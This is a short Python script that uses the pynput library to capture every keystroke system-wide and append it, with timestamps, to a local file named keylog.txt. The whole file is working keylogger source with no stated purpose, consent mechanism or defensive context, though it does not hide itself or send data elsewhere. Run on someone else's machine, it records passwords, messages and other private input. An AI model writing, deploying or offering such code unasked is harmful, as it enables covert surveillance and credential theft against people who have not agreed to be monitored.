from pynput import keyboard
from datetime import datetime

def on_press(key):
    with open("keylog.txt", "a", encoding="utf-8") as log:
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

        try:
            if key == keyboard.Key.space:
                log.write(" ")
            elif key == keyboard.Key.enter:
                log.write("\n")
            else:
                log.write(f"{timestamp} - {key.char}\n")
        except AttributeError:
            log.write(f"{timestamp} - [{key}]\n")

with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
